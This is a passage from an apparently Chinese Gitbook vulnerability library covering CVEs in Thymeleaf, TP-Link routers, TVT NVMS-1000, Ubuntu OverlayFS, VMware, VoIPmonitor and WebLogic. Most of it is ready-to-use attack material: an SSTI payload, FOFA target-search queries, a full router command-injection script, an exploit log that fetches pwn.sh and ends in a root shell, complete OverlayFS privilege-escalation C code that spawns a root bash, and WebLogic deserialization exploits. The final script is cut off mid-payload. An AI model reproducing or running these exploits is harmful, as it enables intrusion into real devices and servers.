Bypass.html","title":"Thymeleaf 3.0.12 RCE Bypass","keywords":"","body":"Thymeleaf 3.0.12 RCE Bypass 问题详情可以见：https://github.com/thymeleaf/thymeleaf/issues/828 通过更改表达式可以进行绕过安全检查，在T和(之间添加若干个空格字符即可绕过检查进行RCE。 Payload： ${T (java.lang.Runtime).getRuntime().exec(\"whoami\")} 官方issue:https://github.com/thymeleaf/thymeleaf/issues/828 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/TP-Link AC1750 预认证远程代码执行漏洞（CVE-2021-27246）.html":{"url":"Edge_Security/TP-Link AC1750 预认证远程代码执行漏洞（CVE-2021-27246）.html","title":"TP-Link AC1750 预认证远程代码执行漏洞（CVE-2021-27246）","keywords":"","body":"TP-Link AC1750 预认证远程代码执行漏洞（CVE-2021-27246） 在TP-Link AC1750的tdpServer守护程序中存在漏洞，没有检查json数据的大小，导致了缓冲区溢出，通过缓冲区溢出，可以导致代码执行。 FOFA: app=\"TP_LINK-AC1750\" 漏洞详情见：https://www.synacktiv.com/publications/pwn2own-tokyo-2020-defeating-the-tp-link-ac1750.html poc：https://github.com/synacktiv/CVE-2021-27246_Pwn2Own2020 $ bash exploit.sh [+] Launching web server for distribution of pwn.sh Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... INFO:tdpwn:Associating 49 onemesh clients... INFO:tdpwn:Done! And wait for 80 seconds... 80 seconds left... 70 seconds left... 60 seconds left... 50 seconds left... 40 seconds left... 30 seconds left... 20 seconds left... 10 seconds left... [+] Trying to exploit the tddp injection INFO:tdp:Preparing tddpv1_configset payload INFO:tdp:Sending payload [+] Trying the root shell (Low probability of success...) nc -v 192.168.0.1 12345 nc: connect to 192.168.0.1 port 12345 (tcp) failed: Connection refused [ ] If shell hasn't succeed, don't worry, we retry INFO:tdpwn:Associating 49 onemesh clients... INFO:tdpwn:Done! And wait for 80 seconds... 80 seconds left... 70 seconds left... 60 seconds left... 50 seconds left... 40 seconds left... 30 seconds left... 20 seconds left... 10 seconds left... [+] Trying to exploit the tddp injection INFO:tdp:Preparing tddpv1_configset payload INFO:tdp:Sending payload 192.168.0.1 - - [30/Nov/2020 12:10:59] \"GET /pwn.sh HTTP/1.1\" 200 - [+] Trying the root shell (High probability of success...) nc -v 192.168.0.1 12345 Connection to 192.168.0.1 12345 port [tcp/*] succeeded! uname -a Linux ArcherA7v5 3.3.8 #1 Mon Sep 14 19:52:46 CST 2020 mips GNU/Linux id uid=0(root) gid=0(root) ^C[-] Stopping Webserver, now Terminated ref: https://www.synacktiv.com/public ... tp-link-ac1750.html https://github.com/synacktiv/CVE-2021-27246_Pwn2Own2020 https://nvd.nist.gov/vuln/detail/CVE-2021-27246 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/TP-Link TL-WR841N远程代码执行漏洞（CVE-2020-35576）.html":{"url":"Edge_Security/TP-Link TL-WR841N远程代码执行漏洞（CVE-2020-35576）.html","title":"TP-Link TL-WR841N远程代码执行漏洞（CVE-2020-35576）","keywords":"","body":"TP-Link TL-WR841N远程代码执行漏洞（CVE-2020-35576） 通过该漏洞，经过身份验证的攻击者可以在TP-Link TL-WR841N系统上执行任意命令。 影响版本： TP-Link TL-WR841N FOFA： app=\"TP_LINK-TL-WR841N\" tplink-CVE-2020-35576-PoC.py： # Author: Koh You Liang (Isopach) # Exploit Title: TP-Link TL-WR841N OS Command Injection Exploit # Date: 2020-12-13 # Vendor Homepage: https://www.tp-link.com/ # Software Link: https://www.tp-link.com/jp/support/download/tl-wr841n/v13/#Firmware # Version: TL-WR841N 0.9.1 4.0 # Tested on: Windows 10, macOS Mojave, Ubuntu 20.04.1 LTS # CVE: CVE-2020-35576 import requests import sys import time try: _ = sys.argv[2] payload = ' '.join(sys.argv[1:]) except IndexError: try: payload = sys.argv[1] except IndexError: print(\"[*] Command not specified, using the default `cat etc/passwd`\") payload = 'cat etc/passwd' # Default credentials is admin:admin - replace with your own cookies = { 'Authorization': 'Basic YWRtaW46YWRtaW4=' } headers = { 'Host': '192.168.0.1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Accept': '*/*', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'text/plain', 'Content-Length': '197', 'Origin': 'http://192.168.0.1', 'Connection': 'close', 'Referer': 'http://192.168.0.1/mainFrame.htm', } data1 = \\ '''[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,8\\r\\nmaxHopCount=20\\r\\ntimeout=50\\r\\nnumberOfTries=1\\r\\nhost=\"`{}`\"\\r\\ndataBlockSize=64\\r\\nX_TP_ConnName=ewan_ipoe_d\\r\\ndiagnosticsState=Requested\\r\\nX_TP_HopSeq=0\\r\\n'''.format(payload) response1 = requests.post('http://192.168.0.1/cgi?2', headers=headers, cookies=cookies, data=data1, verify=False) print('[+] Sending payload...') try: response1.text.splitlines()[0] except IndexError: sys.exit('[-] Cannot get response. Please check your cookie.') if response1.text.splitlines()[0] != '[error]0': sys.exit('[*] Router/Firmware is not vulnerable.') data2 = '[ACT_OP_TRACERT#0,0,0,0,0,0#0,0,0,0,0,0]0,0\\r\\n' response2 = requests.post('http://192.168.0.1/cgi?7', headers=headers, cookies=cookies, data=data2, verify=False) print('[+] Receiving response from router...') time.sleep(0.8) # Buffer time for traceroute to succeed data3 = '''[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,3\\r\\ndiagnosticsState\\r\\nX_TP_HopSeq\\r\\nX_TP_Result\\r\\n''' response3 = requests.post('http://192.168.0.1/cgi?1', headers=headers, cookies=cookies, data=data3, verify=False) if '=:' in response3.text.splitlines()[3]: print('[-] Command not supported.') else: print('[+] Exploit successful!') for line_number, line in enumerate(response3.text.splitlines()): try: if line_number == 3: print(line[12:]) if line_number > 3 and line != '[error]0': print(line) if 'not known' in line: break except IndexError: break ref： https://isopach.dev/CVE-2020-35576/ https://vulmon.com/vulnerabilitydetails?qid=CVE-2020-35576 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/TP-Link WR2041 v1拒绝服务漏洞（CVE-2021-26827）.html":{"url":"Edge_Security/TP-Link WR2041 v1拒绝服务漏洞（CVE-2021-26827）.html","title":"TP-Link WR2041 v1拒绝服务漏洞（CVE-2021-26827）","keywords":"","body":"TP-Link WR2041 v1拒绝服务漏洞（CVE-2021-26827） 在TP-Link WR2041 v1存在拒绝服务漏洞，攻击者向/userRpm/popupSiteSurveyRpm.html发送恶意payload可以导致拒绝服务。 poc: GET /userRpm/popupSiteSurveyRpm.htm?ssid=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa HTTP/1.1 Host: 192.168.1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Connection: close Referer: http://192.168.1.1/userRpm/WlanNetworkRpm.htm Cookie: Authorization=Basic YWRtaW46YWRtaW4xMjM=; ChgPwdSubTag= Upgrade-Insecure-Requests: 1 ref： https://nvd.nist.gov/vuln/detail/CVE-2021-26827 https://github.com/GD008/vuln/blob/main/tplink_wr2041/tplink_WR2041pv1.md Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/TP-link 栈溢出漏洞（CVE-2021-29302）.html":{"url":"Edge_Security/TP-link 栈溢出漏洞（CVE-2021-29302）.html","title":"TP-link 栈溢出漏洞（CVE-2021-29302）","keywords":"","body":"TP-link 栈溢出漏洞（CVE-2021-29302） httpd进程解析HTTP正文消息时会出现缓冲区溢出，这可能导致远程代码执行。例如，当我们第一次设置路由器密码时，http守护进程不会验证外部http消息。如果传输的用户名或密码太长，会导致httpd进程堆空间溢出。 影响版本： V4_200 PoC已公开：https://github.com/liyansong2018/CVE/tree/main/2021/CVE-2021-29302 import requests headers = { \"Host\": \"192.168.0.1\", \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\", \"Accept\": \"*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"text/plain\", \"Content-Length\": \"78\", \"Origin\": \"http://192.168.0.1\", \"Connection\": \"close\", \"Referer\": \"http://192.168.0.1/\" } payload = \"a\" * 512 + \"b\" * 1024 formdata = \"[/cgi/auth#0,0,0,0,0,0#0,0,0,0,0,0]0,3\\r\\nname={}\\r\\noldPwd=admin\\r\\npwd=lys123\\r\\n\".format(payload) proxies = { \"http\": \"http://127.0.0.1:8080\", } url = \"http://192.168.0.1/cgi?8\" response = requests.post(url, data=formdata, headers=headers, proxies=proxies) print response.text ref： https://github.com/liyansong2018/CVE/tree/main/2021/CVE-2021-29302 https://nvd.nist.gov/vuln/detail/CVE-2021-29302 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/TVT数码科技 NVMS-1000 路径遍历漏洞.html":{"url":"Edge_Security/TVT数码科技 NVMS-1000 路径遍历漏洞.html","title":"TVT数码科技 NVMS-1000 路径遍历漏洞","keywords":"","body":"TVT数码科技 NVMS-1000 路径遍历漏洞 TVT数码科技 TVT NVMS-1000是中国TVT数码科技公司的一套网络监控视频管理系统。 TVT数码科技 TVT NVMS-1000中存在路径遍历漏洞。远程攻击者可通过发送包含/../的特制URL请求利用该漏洞查看系统上的任意文件。 GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 ref： http://wiki.xypbk.com/Web%E5%AE%89%E5%85%A8/TVT%E6%95%B0%E7%A0%81%E7%A7%91%E6%8A%80-NVMS-1000/TVT%E6%95%B0%E7%A0%81%E7%A7%91%E6%8A%80%20NVMS-1000%20%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md?btwaf=20301571 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Typora 0.9.67 XSS到RCE（CVE-2020-18737）.html":{"url":"Edge_Security/Typora 0.9.67 XSS到RCE（CVE-2020-18737）.html","title":"Typora 0.9.67 XSS到RCE（CVE-2020-18737）","keywords":"","body":"Typora 0.9.67 XSS到RCE（CVE-2020-18737） 在Typora 0.9.67中存在一个XSS漏洞，该漏洞会导致远程执行代码。 RCE： graph LR id1[\"\"] ref： https://github.com/typora/typora-issues/issues/2289 https://nvd.nist.gov/vuln/detail/CVE-2020-18737 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Ubuntu OverlayFS 权限提升漏洞（CVE-2021-3493）.html":{"url":"Edge_Security/Ubuntu OverlayFS 权限提升漏洞（CVE-2021-3493）.html","title":"Ubuntu OverlayFS 权限提升漏洞（CVE-2021-3493）","keywords":"","body":"Ubuntu OverlayFS 权限提升漏洞（CVE-2021-3493） Linux内核中overlayfs文件系统中的Ubuntu特定问题，在该问题中，它未正确验证关于用户名称空间的文件系统功能的应用。由于Ubuntu附带了一个允许非特权的overlayfs挂载的补丁，因此本地攻击者可以使用它来获得更高的特权。 影响版本： Ubuntu的20.10 Ubuntu 20.04 LTS Ubuntu 18.04 LTS Ubuntu 16.04 LTS Ubuntu 14.04 ESM 漏洞分析见：https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/ Exploit： #define _GNU_SOURCE #include #include #include #include #include #include #include #include #include #include #include #include //#include //#include int setxattr(const char *path, const char *name, const void *value, size_t size, int flags); #define DIR_BASE \"./ovlcap\" #define DIR_WORK DIR_BASE \"/work\" #define DIR_LOWER DIR_BASE \"/lower\" #define DIR_UPPER DIR_BASE \"/upper\" #define DIR_MERGE DIR_BASE \"/merge\" #define BIN_MERGE DIR_MERGE \"/magic\" #define BIN_UPPER DIR_UPPER \"/magic\" static void xmkdir(const char *path, mode_t mode) { if (mkdir(path, mode) == -1 && errno != EEXIST) err(1, \"mkdir %s\", path); } static void xwritefile(const char *path, const char *data) { int fd = open(path, O_WRONLY); if (fd == -1) err(1, \"open %s\", path); ssize_t len = (ssize_t) strlen(data); if (write(fd, data, len) != len) err(1, \"write %s\", path); close(fd); } static void xcopyfile(const char *src, const char *dst, mode_t mode) { int fi, fo; if ((fi = open(src, O_RDONLY)) == -1) err(1, \"open %s\", src); if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1) err(1, \"open %s\", dst); char buf[4096]; ssize_t rd, wr; for (;;) { rd = read(fi, buf, sizeof(buf)); if (rd == 0) { break; } else if (rd == -1) { if (errno == EINTR) continue; err(1, \"read %s\", src); } char *p = buf; while (rd > 0) { wr = write(fo, p, rd); if (wr == -1) { if (errno == EINTR) continue; err(1, \"write %s\", dst); } p += wr; rd -= wr; } } close(fi); close(fo); } static int exploit() { char buf[4096]; sprintf(buf, \"rm -rf '%s/'\", DIR_BASE); system(buf); xmkdir(DIR_BASE, 0777); xmkdir(DIR_WORK, 0777); xmkdir(DIR_LOWER, 0777); xmkdir(DIR_UPPER, 0777); xmkdir(DIR_MERGE, 0777); uid_t uid = getuid(); gid_t gid = getgid(); if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1) err(1, \"unshare\"); xwritefile(\"/proc/self/setgroups\", \"deny\"); sprintf(buf, \"0 %d 1\", uid); xwritefile(\"/proc/self/uid_map\", buf); sprintf(buf, \"0 %d 1\", gid); xwritefile(\"/proc/self/gid_map\", buf); sprintf(buf, \"lowerdir=%s,upperdir=%s,workdir=%s\", DIR_LOWER, DIR_UPPER, DIR_WORK); if (mount(\"overlay\", DIR_MERGE, \"overlay\", 0, buf) == -1) err(1, \"mount %s\", DIR_MERGE); // all+ep char cap[] = \"\\x01\\x00\\x00\\x02\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\"; xcopyfile(\"/proc/self/exe\", BIN_MERGE, 0777); if (setxattr(BIN_MERGE, \"security.capability\", cap, sizeof(cap) - 1, 0) == -1) err(1, \"setxattr %s\", BIN_MERGE); return 0; } int main(int argc, char *argv[]) { if (strstr(argv[0], \"magic\") || (argc > 1 && !strcmp(argv[1], \"shell\"))) { setuid(0); setgid(0); execl(\"/bin/bash\", \"/bin/bash\", \"--norc\", \"--noprofile\", \"-i\", NULL); err(1, \"execl /bin/bash\"); } pid_t child = fork(); if (child == -1) err(1, \"fork\"); if (child == 0) { _exit(exploit()); } else { waitpid(child, NULL, 0); } execl(BIN_UPPER, BIN_UPPER, \"shell\", NULL); err(1, \"execl %s\", BIN_UPPER); ref： https://ubuntu.com/security/CVE-2021-3493 https://nvd.nist.gov/vuln/detail/CVE-2021-3493 https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/ https://github.com/briskets/CVE-2021-3493 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/VMware vCenter 未经身份验证任意文件读取漏洞 < 6.5u1.html":{"url":"Edge_Security/VMware vCenter 未经身份验证任意文件读取漏洞 < 6.5u1.html","title":"VMware vCenter 未经身份验证任意文件读取漏洞 < 6.5u1","keywords":"","body":"VMware vCenter 未经身份验证任意文件读取漏洞 VMware vCenter 未经身份验证任意文件读取漏洞 $user/vib?id=C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\http://vcdb.properties PoC /eam/vib?id=C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/VMware Workspace ONE Access 命令注入漏洞（CVE-2020-4006）.html":{"url":"Edge_Security/VMware Workspace ONE Access 命令注入漏洞（CVE-2020-4006）.html","title":"VMware Workspace ONE Access 命令注入漏洞（CVE-2020-4006）","keywords":"","body":"VMware Workspace ONE Access 命令注入漏洞（CVE-2020-4006） 2020年11月23日，VMware发布安全公告，其多个产品和组件的管理配置器中存在一个命令注入漏洞（CVE-2020-4006），其CVSS评分9.1。具有管理配置器8443端口的网络访问权限并拥有管理配置器admin帐户和密码的攻击者可以利用此漏洞在系统上执行命令。 详情见：https://attackerkb.com/topics/2DKGb1v8mA/cve-2020-4006 漏洞位于 /cfg/ssl/installSelfSignedCertificate TLS端口8443上的 “Appliance Configurator” 服务中的端点中，通过san参数在POST对端点的请求中指定恶意参数，可以执行任意shell命令。请注意该服务可能会重新启动。活动会记录在/opt/vmware/horizon/workspace/logs/configurator.log文件中。 ref： https://attackerkb.com/topics/2DKGb1v8mA/cve-2020-4006 https://twitter.com/wvuuuuuuuuuuuuu/status/1391887171649515529 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/VoIPmonitor UnAuth RCE（CVE-2021-30461）.html":{"url":"Edge_Security/VoIPmonitor UnAuth RCE（CVE-2021-30461）.html","title":"VoIPmonitor UnAuth RCE（CVE-2021-30461）","keywords":"","body":"VoIPmonitor UnAuth RCE（CVE-2021-30461） VoIPmonitor 是一个开源的实时网络抓包并分析SIP和RTP protocol的程序.使用通过Web界面到达的用户提供的数据，使用SPOOLDIR和recheck参数对index.php文件发出POST请求时，远程攻击者可以运行任意命令。 影响版本： VoIPmonitor 24.60 及更低版本 poc： POST /index.php HTTP/1.1 Host: 206.166.208.228 SPOOLDIR=test%22.system%28whoami%29.%22 ref： https://ssd-disclosure.com/ssd-advisory-voipmonitor-unauth-rce/ Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Wazuh Manager 代码执行漏洞（CVE-2021-26814）.html":{"url":"Edge_Security/Wazuh Manager 代码执行漏洞（CVE-2021-26814）.html","title":"Wazuh Manager 代码执行漏洞（CVE-2021-26814）","keywords":"","body":"Wazuh Manager 代码执行漏洞（CVE-2021-26814） Wazuh 从4.0.0到4.0.3的 Wazuh API允许经过身份验证的用户通过/manager/files URI以管理权限执行任意代码。 影响版本： Wazuh Manager v.4.0.0-4.0.3 poc.py:https://github.com/WickdDavid/CVE-2021-26814 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Weblogic Server远程代码执行漏洞（CVE-2020-14756）.html":{"url":"Edge_Security/Weblogic Server远程代码执行漏洞（CVE-2020-14756）.html","title":"Weblogic Server远程代码执行漏洞（CVE-2020-14756）","keywords":"","body":"Weblogic Server远程代码执行漏洞（CVE-2020-14756） 详细分析见：https://y4er.com/post/weblogic-cve-2020-14756/ CVE_2020_14756.java： package com.supeream; import com.supeream.serial.Serializables; import com.supeream.weblogic.T3ProtocolOperation; // coherence-rest.jar import com.tangosol.coherence.rest.util.extractor.MvelExtractor; // coherence-web.jar import com.tangosol.coherence.servlet.AttributeHolder; // coherence.jar import com.tangosol.util.SortedBag; import com.tangosol.util.aggregator.TopNAggregator; import java.io.File; import java.io.FileOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.lang.reflect.Method; public class CVE_2020_14756 { public static void main(String[] args) { MvelExtractor extractor = new MvelExtractor(\"java.lang.Runtime.getRuntime().exec(\\\"calc\\\");\"); MvelExtractor extractor2 = new MvelExtractor(\"\"); try { SortedBag sortedBag = new TopNAggregator.PartialResult(extractor2, 2); AttributeHolder attributeHolder = new AttributeHolder(); sortedBag.add(1); Field m_comparator = sortedBag.getClass().getSuperclass().getDeclaredField(\"m_comparator\"); m_comparator.setAccessible(true); m_comparator.set(sortedBag, extractor); Method setInternalValue = attributeHolder.getClass().getDeclaredMethod(\"setInternalValue\", Object.class); setInternalValue.setAccessible(true); setInternalValue.invoke(attributeHolder, sortedBag); /* FileOutputStream fileOutputStream = new FileOutputStream(new File(\"test.ser\")); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(attributeHolder); */ T3ProtocolOperation.send(\"192.168.65.128\", \"7001\", Serializables.serialize(attributeHolder)); } catch (Exception e) { e.printStackTrace(); } } } weblogic_t3.py： #!/usr/bin/python import socket import os import sys import struct if len(sys.argv) ' % os.path.basename(sys.argv[0]) sys.exit() sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(5) server_address = (sys.argv[1], int(sys.argv[2])) print '[+] Connecting to %s port %s' % server_address sock.connect(server_address) # Send headers headers='t3 12.2.1\\nAS:255\\nHL:19\\nMS:10000000\\nPU:t3://us-l-breens:7001\\n\\n' print 'sending \"%s\"' % headers sock.sendall(headers) data = sock.recv(1024) print >>sys.stderr, 'received \"%s\"' % data payloadObj = open(sys.argv[3],'rb').read() payload='\\x00\\x00\\x09\\xf3\\x01\\x65\\x01\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x71\\x00\\x00\\xea\\x60\\x00\\x00\\x00\\x18\\x43\\x2e\\xc6\\xa2\\xa6\\x39\\x85\\xb5\\xaf\\x7d\\x63\\xe6\\x43\\x83\\xf4\\x2a\\x6d\\x92\\xc9\\xe9\\xaf\\x0f\\x94\\x72\\x02\\x79\\x73\\x72\\x00\\x78\\x72\\x01\\x78\\x72\\x02\\x78\\x70\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x70\\x70\\x70\\x70\\x70\\x70\\x00\\x00\\x00\\x0c\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x70\\x06\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1d\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x43\\x6c\\x61\\x73\\x73\\x54\\x61\\x62\\x6c\\x65\\x45\\x6e\\x74\\x72\\x79\\x2f\\x52\\x65\\x81\\x57\\xf4\\xf9\\xed\\x0c\\x00\\x00\\x78\\x70\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\xe6\\xf7\\x23\\xe7\\xb8\\xae\\x1e\\xc9\\x02\\x00\\x09\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x4c\\x00\\x09\\x69\\x6d\\x70\\x6c\\x54\\x69\\x74\\x6c\\x65\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x4c\\x00\\x0a\\x69\\x6d\\x70\\x6c\\x56\\x65\\x6e\\x64\\x6f\\x72\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x0b\\x69\\x6d\\x70\\x6c\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x71\\x00\\x7e\\x00\\x03\\x78\\x70\\x77\\x02\\x00\\x00\\x78\\xfe\\x01\\x00\\x00' payload=payload+payloadObj payload=payload+'\\xfe\\x01\\x00\\x00\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x1d\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x72\\x6a\\x76\\x6d\\x2e\\x43\\x6c\\x61\\x73\\x73\\x54\\x61\\x62\\x6c\\x65\\x45\\x6e\\x74\\x72\\x79\\x2f\\x52\\x65\\x81\\x57\\xf4\\xf9\\xed\\x0c\\x00\\x00\\x78\\x70\\x72\\x00\\x21\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x50\\x65\\x65\\x72\\x49\\x6e\\x66\\x6f\\x58\\x54\\x74\\xf3\\x9b\\xc9\\x08\\xf1\\x02\\x00\\x07\\x49\\x00\\x05\\x6d\\x61\\x6a\\x6f\\x72\\x49\\x00\\x05\\x6d\\x69\\x6e\\x6f\\x72\\x49\\x00\\x0b\\x70\\x61\\x74\\x63\\x68\\x55\\x70\\x64\\x61\\x74\\x65\\x49\\x00\\x0c\\x72\\x6f\\x6c\\x6c\\x69\\x6e\\x67\\x50\\x61\\x74\\x63\\x68\\x49\\x00\\x0b\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x50\\x61\\x63\\x6b\\x5a\\x00\\x0e\\x74\\x65\\x6d\\x70\\x6f\\x72\\x61\\x72\\x79\\x50\\x61\\x74\\x63\\x68\\x5b\\x00\\x08\\x70\\x61\\x63\\x6b\\x61\\x67\\x65\\x73\\x74\\x00\\x27\\x5b\\x4c\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2f\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2f\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2f\\x50\\x61\\x63\\x6b\\x61\\x67\\x65\\x49\\x6e\\x66\\x6f\\x3b\\x78\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x6e\\x61\\x6c\\x2e\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x49\\x6e\\x66\\x6f\\x97\\x22\\x45\\x51\\x64\\x52\\x46\\x3e\\x02\\x00\\x03\\x5b\\x00\\x08\\x70\\x61\\x63\\x6b\\x61\\x67\\x65\\x73\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x0e\\x72\\x65\\x6c\\x65\\x61\\x73\\x65\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x5b\\x00\\x12\\x76\\x65\\x72\\x73\\x69\\x6f\\x6e\\x49\\x6e\\x66\\x6f\\x41\\x73\\x42\\x79\\x74\\x65\\x73\\x74\\x00\\x02\\x5b\\x42\\x78\\x72\\x00\\x24\\x77\\x65\\x62\\x6c\\x6f\\x67\\x69\\x63\\x2e\\x63\\x6f\\x6d\\x6d\\x6f\\x6e\\x2e\\x69\\x6e\\x74\\x65\\x72\\x